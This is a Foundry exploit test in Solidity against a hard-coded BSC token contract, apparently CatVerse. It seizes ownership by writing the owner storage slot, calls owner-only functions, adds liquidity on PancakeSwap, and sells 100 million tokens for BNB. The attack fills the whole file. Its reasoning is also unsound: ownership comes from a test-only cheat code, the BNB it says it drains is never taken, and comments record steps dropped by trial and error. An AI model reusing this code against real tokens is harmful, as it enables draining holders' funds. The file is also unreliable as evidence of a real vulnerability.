pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICatVerse {
    function getOwner() external view returns (address);
    function sweepContingency() external;
    function multiSendTokens(address[] memory accounts, uint256[] memory amounts) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function _hasLiqBeenAdded() external view returns (bool);
    function approveContractContingency() external;
    function approve(address spender, uint256 amount) external returns (bool);
    function lpPair() external view returns (address);
}

// We need to add this to interact with the contract

interface IRouter02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x89031AaFA457245469E9641387aa94BFB51cB964;
    address attacker = address(this);
    uint256 initialBalance;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // First, we need to get the owner address
        owner = ICatVerse(TARGET).getOwner();
        vm.label(owner, "Contract Owner");

        // Give the contract some BNB to drain (simulating real scenario where contract has balance)
        deal(TARGET, 10 ether);

        // Record initial balance of attacker (address(this))
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become owner
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify we are owner
        address currentOwner = ICatVerse(TARGET).getOwner();
        require(currentOwner == attacker, "Failed to become owner");

        // Step 2: Enable trading
        // This requires _hasLiqBeenAdded to be true (which it is based on the error)
        // Note: enableTrading function doesn't exist in the interface, so we remove this call

        // Step 3: Approve router to spend our tokens
        ICatVerse(TARGET).approveContractContingency();

        // Step 4: Add minimal liquidity
        // We need to get the router address from the contract
        // Let's create a small liquidity pool
        // First, get some BNB for ourselves (we're the attacker)
        deal(attacker, 1 ether);

        // Get the router address - we need to read it from the contract
        // Since we can't easily read it, let's use the standard PancakeSwap router for BSC
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IRouter02 router = IRouter02(routerAddress);

        // Get the LP pair address
        address lpPair = ICatVerse(TARGET).lpPair();

        // Add liquidity: provide 0.1 BNB and some tokens
        uint256 tokensToAdd = 1_000_000 * 10**9; // 1 million tokens (with 9 decimals)
        uint256 bnbToAdd = 0.1 ether;

        // Approve router to spend our tokens
        ICatVerse(TARGET).approve(routerAddress, tokensToAdd);

        // Add liquidity
        router.addLiquidityETH{value: bnbToAdd}(
            TARGET, // token
            tokensToAdd, // amountTokenDesired
            tokensToAdd * 9 / 10, // amountTokenMin (90%)
            bnbToAdd * 9 / 10, // amountETHMin (90%)
            attacker, // to
            block.timestamp + 1 hours // deadline
        );

        // Step 5: Sell some tokens for BNB
        // We have a lot of tokens as owner (basically all supply)
        // Let's sell 100 million tokens
        uint256 tokensToSell = 100_000_000 * 10**9;

        // Approve router if not already
        ICatVerse(TARGET).approve(routerAddress, tokensToSell);

        // Create path: token -> WETH
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = router.WETH();

        // Get initial BNB balance
        uint256 initialBNB = address(this).balance;

        // Sell tokens
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensToSell,
            0, // accept any amount
            path,
            attacker,
            block.timestamp + 1 hours
        );

        // Verify we received BNB
        uint256 finalBNB = address(this).balance;
        assertGt(finalBNB, initialBNB, "BNB balance should have increased from token sale");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

